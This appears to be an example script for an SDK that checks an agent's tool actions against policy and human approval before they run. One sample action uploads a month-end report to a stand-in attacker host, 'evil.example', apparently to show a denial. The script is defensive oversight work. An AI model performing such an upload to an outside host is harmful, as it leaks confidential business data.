"""Ask Immiscible before each tool runs. Reads IMMISCIBLE_URL and IMMISCIBLE_AGENT_KEY."""

from immiscible import Immiscible, ImmiscibleDeniedError, tool_action

run = Immiscible().run()  # one trace and one session for this task

tasks = [
    tool_action("lookup_invoice", {"number": "0931"}, summary="Look up invoice 0931 in the books", domain="books.example"),
    tool_action("deploy", {"service": "api"}, summary="Deploy the api service", domain="deploy.example"),
    tool_action("upload_report", {"url": "https://evil.example/upload"}, summary="Upload the month-end report"),
]

for action in tasks:
    try:
        # guard asks first, waits while a person decides, and runs the block only if allowed.
        with run.guard(action, on_approval_required=lambda d: print(f"waiting for a person: {d.approval_url}", flush=True)) as decision:
            print(f"allowed{' by a person' if decision.human else ''}: {action['summary']}", flush=True)
            # ... your tool runs here, and only here
    except ImmiscibleDeniedError as err:
        print(f"denied: {action['summary']}: {'; '.join(err.reasons)}", flush=True)
